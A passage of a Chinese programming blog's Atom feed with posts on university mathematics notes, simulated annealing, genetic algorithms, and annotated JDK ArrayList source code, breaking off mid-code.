src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/3.%E6%A0%BC%E6%9E%97%E5%85%AC%E5%BC%8F%E5%8F%8A%E5%BA%94%E7%94%A8/3%E6%A0%BC%E6%9E%97%E5%85%AC%E5%BC%8F%E5%8F%8A%E5%BA%94%E7%94%A8_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/3.%E6%A0%BC%E6%9E%97%E5%85%AC%E5%BC%8F%E5%8F%8A%E5%BA%94%E7%94%A8/3%E6%A0%BC%E6%9E%97%E5%85%AC%E5%BC%8F%E5%8F%8A%E5%BA%94%E7%94%A8_2.jpg" alt="测试">    </p>  </li>  <li>    <p>对面积的曲面积分</p>  </li></ol><p><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/4.%E5%AF%B9%E9%9D%A2%E7%A7%AF%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/4%E5%AF%B9%E9%9D%A2%E7%A7%AF%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86.jpg" alt="测试"></p><ol start="5">  <li>    <p>对坐标的曲面积分<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/5.%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/5%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86_1.jpg" alt="测试"><br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/5.%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/5%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86_2.jpg" alt="测试">    </p>  </li>  <li>    <p>高斯公式<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/6.%E9%AB%98%E6%96%AF%E5%85%AC%E5%BC%8F/6%E9%AB%98%E6%96%AF%E5%85%AC%E5%BC%8F.jpg" alt="测试">    </p>  </li>  <li>    <p>斯托克斯公式<br><img src="https://github.com/starstarb/Postgraduate-Advanced-Mathematics/raw/master/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%20%E4%B8%8B%E5%86%8C%EF%BC%88%E5%90%8C%E6%B5%8E%E4%B8%83%E7%89%88%EF%BC%89%E6%B1%A4%E5%AE%B6%E5%87%A4%E7%B2%BE%E8%AE%B2/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%20%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%9B%B2%E9%9D%A2%E7%A7%AF%E5%88%86/7.%E6%96%AF%E6%89%98%E5%85%8B%E6%96%AF%E5%85%AC%E5%BC%8F/7%E4%B8%89%E7%BB%B4%E7%A9%BA%E9%97%B4%E5%AF%B9%E5%9D%90%E6%A0%87%E7%9A%84%E6%9B%B2%E7%BA%BF%E7%A7%AF%E5%88%86%E4%B8%8E%E6%96%AF%E6%89%98%E5%85%8B%E6%96%AF%E5%85%AC%E5%BC%8F.jpg" alt="测试">    </p>  </li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;三大基础数学复习&lt;/p&gt;
    
    </summary>
    
      <category term="数学基础" scheme="http://javastar.club/categories/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="数学基础" scheme="http://javastar.club/tags/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>模拟退火算法</title>
    <link href="http://javastar.club/archives/a0d601b7.html"/>
    <id>http://javastar.club/archives/a0d601b7.html</id>
    <published>2019-08-05T03:50:24.000Z</published>
    <updated>2019-08-07T07:14:52.705Z</updated>
    
    <content type="html"><![CDATA[<p>SA:python语言实现</p><a id="more"></a><h3 id="模拟退火算法-SimulatedAnnealing"><a href="#模拟退火算法-SimulatedAnnealing" class="headerlink" title="模拟退火算法(SimulatedAnnealing)"></a>模拟退火算法(SimulatedAnnealing)</h3><p>是基于Monte-Carlo迭代求解策略的一种随机寻优算法,主要用于组合优化问题的求解。<br>例如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">f(x)=x^3-60*x^2-4*x+6</span><br></pre>      </td>    </tr>  </table></figure><p>  目标：求解在0到100范围内的最小值<br>数学方法一般求导计算.如果不求导计算，可能第一反应都是穷举法，把范围内每个值都算一遍再比较大小。如果求的是整数范围，那么要算100遍，但是如果要精确到小数后8位，则要算10000000000次，即便使用计算机依然是一个庞大的运算过程。而优化问题中很多都类似于问题，无法用穷举法解出答案，我们叫这类问题为NP难问题（可查看维基百科：NP-hard）</p><p>模拟退火算法，它是一种启发式搜索算法，即按照预定的控制策略进行搜索，在搜索过程中获取的中间信息将用来改进控制策略</p><ol>  <li>模拟退火算法的原理</li></ol><p><strong>1.1概念</strong></p><p>  模拟退火算法的思想借鉴于固体的退火原理，当固体的温度很高的时候，内能比较大，固体的内部粒子处于快速无序运动，当温度慢慢降低的过程中，固体的内能减小，粒子的慢慢趋于有序，最终，当固体处于常温时，内能达到最小，此时，粒子最为稳定。模拟退火算法便是基于这样的原理设计而成。</p><p>  模拟退火算法从某一高温出发，在高温状态下计算初始解，然后以预设的邻域函数产生一个扰动量，从而得到新的状态，即模拟粒子的无序运动，比较新旧状态下的能量，即目标函数的解。如果新状态的能量小于旧状态，则状态发生转化；如果新状态的能量大于旧状态，则以一定的概率准则发生转化。当状态稳定后，便可以看作达到了当前状态的最优解，便可以开始降温，在下一个温度继续迭代，最终达到低温的稳定状态，便得到了模拟退火算法产生的结果。</p><p><strong>1.2状态空间与邻域函数</strong></p><p>  状态空间也称为搜索空间，它由经过编码的可行解的集合所组成。而邻域函数应尽可能满足产生的候选解遍布全部状态空间。其通常由产生候选解的方式和候选解产生的概率分布组成。候选解一般按照某一概率密度函数对解空间进行随机采样获得，而概率分布可以为均匀分布、正态分布、指数分布等。</p><p><strong>1.3状态转移概率（Metropolis准则)</strong></p><p>状态转移概率是指从一个状态转换成另一个状态的概率，模拟退火算法中一般采用Metropolis准则<br><strong>1.4冷却进度表</strong></p><p>冷却进度表是指从某一高温状态T向低温状态冷却时的降温函数</p><p><strong>1.5初始温度</strong></p><p>一般来说，初始温度越大，获得高质量解的几率越大，但是花费的时间也会随之增加，因此，初温的确定应该同时考虑计算效率与优化质量，常用的方法包括：</p><p>(1)均匀抽样一组状态，以各状态目标值的方差为初温。</p><p>(2)随机产生一组状态，确定各状态间的最大目标值差，然后根据差值，利用一定的函数确定初温<br><strong>1.6循环终止准则</strong></p><p>内循环终止准则：</p><p>（1）检验目标函数的均值是否稳定</p><p>（2）连续若干步的目标值变化较小</p><p>（3）按一定的步数进行抽样</p><p>外循环终止准则</p><p>（1）设置终止温度</p><p>（2）设置外循环迭代次数</p><p>（3）算法搜索到的最优值连续若干步保持不变</p><p>（4）检验系统熵是否稳定</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SA:python语言实现&lt;/p&gt;
    
    </summary>
    
      <category term="SA" scheme="http://javastar.club/categories/SA/"/>
    
    
      <category term="SA" scheme="http://javastar.club/tags/SA/"/>
    
  </entry>
  
  <entry>
    <title>遗传算法</title>
    <link href="http://javastar.club/archives/9cfaa3ca.html"/>
    <id>http://javastar.club/archives/9cfaa3ca.html</id>
    <published>2019-08-05T03:50:13.000Z</published>
    <updated>2019-08-07T07:14:52.705Z</updated>
    
    <content type="html"><![CDATA[<p>GA算法：Python实现</p><a id="more"></a><h3 id="GA"><a href="#GA" class="headerlink" title="GA"></a>GA</h3><p>遗传算法（Genetic  Algorithm)和模拟退火算法一样，也是搜索启发式算法的一种，它是借鉴了自然界优胜劣汰与适者生存的思想，通过模拟自然界这一过程来搜索最优解，在机器学习、组合优化等方面有广泛的用途。</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>遗传算法的组成主要包括4个部分：<br>（1）编码<br>（2）适应度函数<br>（3）遗传算子（选择，交叉，变异）<br>（4）运行参数 </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GA算法：Python实现&lt;/p&gt;
    
    </summary>
    
      <category term="GA" scheme="http://javastar.club/categories/GA/"/>
    
    
      <category term="GA" scheme="http://javastar.club/tags/GA/"/>
    
  </entry>
  
  <entry>
    <title>JDK源码阅读笔记</title>
    <link href="http://javastar.club/archives/b6ab39d1.html"/>
    <id>http://javastar.club/archives/b6ab39d1.html</id>
    <published>2019-08-02T03:46:06.000Z</published>
    <updated>2019-08-07T07:14:52.689Z</updated>
    
    <content type="html"><![CDATA[<p>源代码阅读：基于JDK12.0，若有不对，请指正。</p><a id="more"></a><h1 id="ArrayList源码阅读"><a href="#ArrayList源码阅读" class="headerlink" title="ArrayList源码阅读"></a>ArrayList源码阅读</h1><p><strong>ArrayList简介</strong></p><ul>  <li>    <p>ArrayList 是一个数组队列，相当于 动态数组。</p>  </li>  <li>    <p>与Java中的数组相比，它的容量能动态增长。它继承于AbstractList，实现了List, RandomAccess, Cloneable,      java.io.Serializable这些接口。</p>  </li>  <li>    <p>ArrayList 继承了AbstractList，实现了List。它是一个数组队列，提供了相关的添加、删除、修改、遍历等功能。</p>  </li>  <li>    <p>ArrayList      实现了RandmoAccess接口，即提供了随机访问功能。RandmoAccess是java中用来被List实现，为List提供快速访问功能的。在ArrayList中，我们即可以通过元素的序号快速获取元素对象；这就是快速随机访问。稍后，我们会比较List的“快速随机访问”和“通过Iterator迭代器访问”的效率。    </p>  </li>  <li>    <p>ArrayList 实现了Cloneable接口，即覆盖了函数clone()，能被克隆。</p>  </li>  <li>    <p>ArrayList 实现java.io.Serializable接口，这意味着ArrayList支持序列化，能通过序列化去传输* 。</p>  </li>  <li>    <p>      和Vector不同，ArrayList中的操作不是线程安全的！所以，建议在单线程中才使用ArrayList，而在多线程中可以选择Vector或者CopyOnWriteArrayList。    </p>  </li></ul><h3 id="ArrayList属性"><a href="#ArrayList属性" class="headerlink" title="ArrayList属性"></a>ArrayList属性</h3><p>  ArrayList属性主要就是当前数组长度size，以及存放数组的对象elementData数组，除此之外还有一个经常用到的属性就是从AbstractList继承过来的modCount属性，代表ArrayList集合的修改次数。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt;</span><br><span class="line">        implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</span><br><span class="line">&#123;</span><br><span class="line">//序列化ID</span><br><span class="line">    private static final long serialVersionUID = 8683452581122892189L;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Default initial capacity.</span><br><span class="line">       默认初始容量=10</span><br><span class="line">     */</span><br><span class="line">    private static final int DEFAULT_CAPACITY = 10;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Shared empty array instance used for empty instances.</span><br><span class="line">       用于空实例的共享空数组实例</span><br><span class="line">     */</span><br><span class="line">    private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">      Shared empty array instance used for default sized empty instances. We</span><br><span class="line">      distinguish this from EMPTY_ELEMENTDATA to know how much to inflate when</span><br><span class="line">      first element is added.</span><br><span class="line">      共享空数组实例，用于默认大小的空实例。</span><br><span class="line">      我们将其与上面的EMPTY_ELEMENTDATA区分开来，当添加第一个元素时，我们将了解动态数组扩大了多少容量。</span><br><span class="line">      </span><br><span class="line">     */</span><br><span class="line">    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">      The array buffer into which the elements of the ArrayList are stored.</span><br><span class="line">      The capacity of the ArrayList is the length of this array buffer. Any</span><br><span class="line">      empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><br><span class="line">      will be expanded to DEFAULT_CAPACITY when the first element is added.</span><br><span class="line">     存储ArrayList元素的数组缓冲区。</span><br><span class="line">     ArrayList的容量是这个数组缓冲区的长度。</span><br><span class="line">     任何空的ArrayList在使用时，如果 elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><br><span class="line">     那么在添加第一个元素时扩展为DEFAULT_CAPACITY=10  容量</span><br><span class="line">     */</span><br><span class="line">    transient Object[] elementData; // non-private to simplify nested class access</span><br><span class="line">    //非私有以简化嵌套类访问，当前数据对象存放地方，当前对象不参与序列化</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * The size of the ArrayList (the number of elements it contains).</span><br><span class="line">     *ArrayList的大小(它包含的元素的数量)。</span><br><span class="line">     * @serial</span><br><span class="line">     */</span><br><span class="line">    private int size;</span><br><span class="line"> /*Java中对象的序列化是指：将对象转换成以字节序列的形式来表示，这些字节序列包含了对象的数据和信息，一个序列化后的对象可以被写到数据库或文件中，也可用于网络传输，一般当我们使用缓存cache(内存空间不够有可能会本地存储到硬盘)或远程调用rpc(网络传输)的时候，经常需要让我们的实体类实现Serializable接口，目的就是为了让其可序列化。</span><br><span class="line">  只要某个类实现了Serilizable接口，这个类所有的属性和方法都会自动序列化。</span><br><span class="line">   transient</span><br><span class="line">   作用：让某些被修饰符的成员属性变量不被序列化。</span><br><span class="line">   什么时候可以使用该关键字呢？</span><br><span class="line">   1. 类中的字段值可以根据其他字段推导出来，如一个长方形类有三个属性：长、宽、面积。那么在序列化的时候，面积这个属性就没必要被序列化了。</span><br><span class="line">   2. 实际开发过程中，某些敏感信息不希望在网络中被传输，这些信息对应的变量就可以加上transient关键字。即，这个字段的生命周期仅存于调用者的内存中，而不会被写到磁盘里持久化。</span><br><span class="line">   总而言之，java 的transient关键字为我们提供了便利，你只需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。*/</span><br><span class="line">    /**</span><br><span class="line">      The maximum size of array to allocate (unless necessary).</span><br><span class="line">      Some VMs reserve some header words in an array.</span><br><span class="line">      Attempts to allocate larger arrays may result in</span><br><span class="line">      OutOfMemoryError: Requested array size exceeds VM limit</span><br><span class="line">      要分配的数组的最大大小(除非必要)。</span><br><span class="line">      一些VM在数组中保留一些头信息。</span><br><span class="line">      尝试分配更大的数组可能会导致</span><br><span class="line">      OutOfMemoryError:请求的数组大小超过VM限制</span><br><span class="line">     */</span><br><span class="line">    private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //省略了里面的方法</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="ArrayList构造函数"><a href="#ArrayList构造函数" class="headerlink" title="ArrayList构造函数"></a>ArrayList构造函数</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line">     * Constructs an empty list with the specified initial capacity.</span><br><span class="line">     </span><br><span class="line">       @param  initialCapacity  the initial capacity of the list</span><br><span class="line">       @throws IllegalArgumentException if the specified initial capacity</span><br><span class="line">             is negative</span><br><span class="line"></span><br><span class="line">构造具有指定初始容量的空列表。</span><br><span class="line">@param 参数 ：initialCapacity 列表的初始容量</span><br><span class="line">如果指定初始容量，@抛出IllegalArgumentException异常</span><br><span class="line">   带int类型的构造函数</span><br><span class="line">如果传入参数，则代表指定ArrayList的初始数组长度，传入参数如果是大于等于0，则使用用户的参数初始化，如果用户传入的参数小于0，则抛出异常，构造方法如下：</span><br><span class="line">     */</span><br><span class="line">    public ArrayList(int initialCapacity) &#123;</span><br><span class="line">        if (initialCapacity &gt; 0) &#123;</span><br><span class="line">            this.elementData = new Object[initialCapacity];</span><br><span class="line">        &#125; else if (initialCapacity == 0) &#123;</span><br><span class="line">            this.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Illegal Capacity: &quot;+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Constructs an empty list with an initial capacity of ten.</span><br><span class="line">     构造一个初始容量为10的空列表。</span><br><span class="line">     注意：此时我们创建的ArrayList对象中的elementData中的长度是1，size是0,当进行第一次add的时候，elementData将会变成默认的长度：10.</span><br><span class="line">     无参构造函数</span><br><span class="line">     如果不传入参数，则使用默认无参构建方法创建ArrayList对象，如下：</span><br><span class="line">     */</span><br><span class="line">    public ArrayList() &#123;</span><br><span class="line">        this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Constructs a list containing the elements of the specified</span><br><span class="line">       collection, in the order they are returned by the collection&apos;s</span><br><span class="line">       iterator.</span><br><span class="line">     </span><br><span class="line">      @param c the collection whose elements are to be placed into this list</span><br><span class="line">      @throws NullPointerException if the specified collection is null</span><br><span class="line"></span><br><span class="line">      构造一个包含指定元素的列表</span><br><span class="line">      集合，按照顺序，它们将通过集合迭代器返回。</span><br><span class="line">     @param参数： c集合，它的元素将被放置到这个列表中</span><br><span class="line">       如果指定的集合为空，@抛出NullPointerException</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">带Collection对象的构造函数:</span><br><span class="line">1）将collection对象转换成数组，然后将数组的地址的赋给elementData。</span><br><span class="line">2）更新size的值，同时判断size的大小，如果是size等于0，直接将空对象EMPTY_ELEMENTDATA的地址赋给elementData</span><br><span class="line">3）如果size的值大于0，则执行Arrays.copyOf方法，把collection对象的内容（可以理解为深拷贝）copy到elementData中。</span><br><span class="line"></span><br><span class="line">注意：this.elementData = arg0.toArray(); 这里执行的简单赋值时浅拷贝，所以要执行Arrays.copyOf() 做深拷贝</span><br><span class="line"></span><br><span class="line">     */</span><br><span class="line">    public ArrayList(Collection&lt;? extends E&gt; c) &#123;</span><br><span class="line">        elementData = c.toArray();</span><br><span class="line">        if ((size = elementData.length) != 0) &#123;</span><br><span class="line"></span><br><span class="line">            // defend against c.toArray (incorrectly) not returning Object[]</span><br><span class="line">            // (see e.g. https://bugs.openjdk.java.net/browse/JDK-6260652)</span><br><span class="line"></span><br><span class="line">            if (elementData.getClass() != Object[].class)</span><br><span class="line">                elementData = Arrays.copyOf(elementData, size, Object[].class);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // replace with empty array.</span><br><span class="line"></span><br><span class="line">            this.elementData = EMPTY_ELEMENTDATA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre>      </td>    </tr>  </table></figure><p><strong>遇到的问题：</strong><br>？是“任意类”的意思，extends继承不多说，E是指定类型。<br>E是element  元素,用来定义泛型,可以不写,但是取值的时候要强转,用了泛型就不需要强转(强制类型转换) </p><p>首先，E是泛型。这是java 1.5以后引入的。<br>从此以后，定义一个空的ArrayList需要这样，比如我需要一个MyClass的顺序表，则：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ArrayList&lt;MyClass&gt; myList = new ArrayList&lt;MyClass&gt;();</span><br></pre>      </td>    </tr>  </table></figure><p>这是因为ArrayList类的声明是public class ArrayList<e>。</e></p><p>而此时，MyClass就是“指定类型”E了，意味着所有ArrayList类中声明的E, 换成了MyClass。</p><p>同理如果要使用public ArrayList(Collection&lt;? extends E&gt; c)来构造一个ArrayList，则：</p><p>如我有MySubClass是MyClass的子类。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Collection&lt;MyClass&gt; myCollection; //myCollection里有很多元素。</span><br><span class="line">Collection&lt;MySubClass&gt; mySubCollection; //mySubCollection里有很多元素。</span><br><span class="line">ArrayList&lt;MyClass&gt; myList = new ArrayList&lt;MyClass&gt;(myCollection);</span><br></pre>      </td>    </tr>  </table></figure><p>也可以：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ArrayList&lt;MyClass&gt; myList = new ArrayList&lt;MyClass&gt;(mySubCollection);</span><br></pre>      </td>    </tr>  </table></figure><p>意思是，凡是MyClass或者MyClass的子类的Collection均可以构造成ArrayList<myclass></myclass></p><h3 id="ArrayList的add方法"><a href="#ArrayList的add方法" class="headerlink" title="ArrayList的add方法"></a>ArrayList的add方法</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line">      This helper method split out from add(E) to keep method</span><br><span class="line">      bytecode size under 35 (the -XX:MaxInlineSize default value),</span><br><span class="line">      which helps when add(E) is called in a C1-compiled loop.</span><br><span class="line">这个helper方法从add(E)中分离出来以保留方法</span><br><span class="line">字节码大小小于35 (-XX:MaxInlineSize默认值)，</span><br><span class="line">这有助于在c1编译的循环中调用add(E)。</span><br><span class="line">     */</span><br><span class="line">    private void add(E e, Object[] elementData, int s) &#123;</span><br><span class="line">        if (s == elementData.length)</span><br><span class="line">        elementData = grow();</span><br><span class="line">        elementData[s] = e;</span><br><span class="line">        size = s + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">      Appends the specified element to the end of this list.</span><br><span class="line">     </span><br><span class="line">      @param e element to be appended to this list</span><br><span class="line">      @return &#123;@code true&#125; (as specified by &#123;@link Collection#add&#125;)</span><br><span class="line"></span><br><span class="line">      将指定的元素追加到此列表的末尾。</span><br><span class="line">      要添加到此列表中的@param e元素</span><br><span class="line">     @return &#123;@code true&#125;(由&#123;@link Collection#add&#125;指定)</span><br><span class="line">     */</span><br><span class="line">    public boolean add(E e) &#123;</span><br><span class="line">        modCount++;</span><br><span class="line">        